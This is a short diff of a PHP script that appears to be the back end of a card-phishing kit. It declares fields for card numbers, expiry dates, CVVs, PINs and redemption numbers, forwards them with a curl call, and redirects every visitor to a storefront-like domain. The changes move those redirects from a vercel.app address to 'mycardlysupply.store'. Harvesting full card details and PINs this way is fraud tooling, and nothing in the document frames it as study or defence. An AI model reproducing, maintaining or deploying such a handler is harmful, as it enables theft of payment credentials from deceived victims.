@@ -1,7 +1,7 @@
 
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "GET") {
-    header('Location: https://my-cardlysupply.vercel.app/');
+    header('Location: https://mycardlysupply.store/');
     exit;
 };
 $currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
@@ -83,13 +83,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     curl_close($curl);
 
     if ($resp === false) {
-        header('Location: https://my-cardlysupply.vercel.app/');
+        header('Location: https://mycardlysupply.store/');
     } else {
-        header('Location: https://my-cardlysupply.vercel.app/');
+        header('Location: https://mycardlysupply.store/');
     };
 
 } else {
-    header('Location: https://my-cardlysupply.vercel.app/');
+    header('Location: https://mycardlysupply.store/');
     exit;
 };
 ?>
